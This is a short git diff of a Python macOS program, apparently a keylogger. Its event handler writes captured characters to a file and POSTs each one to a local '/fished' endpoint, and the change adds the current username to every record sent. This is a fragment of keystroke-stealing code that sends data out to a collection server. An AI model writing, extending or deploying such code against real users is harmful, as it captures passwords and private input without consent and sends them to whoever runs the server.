@@ -5,6 +5,7 @@ from PyObjCTools import AppHelper
 import os.path
 import requests
 import json
+import getpass
 lines = []
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, notification):
@@ -22,7 +23,8 @@ def handler(event):
             f.write(l)
         f.close()
         stc = '{}'.format(c)
-        d = {"char": stc}
+        user = '{}'.format(getpass.getuser())
+        d = {user: stc}
         r = requests.post('http://127.0.0.1:3000/fished', data=d)
 
     except KeyboardInterrupt:
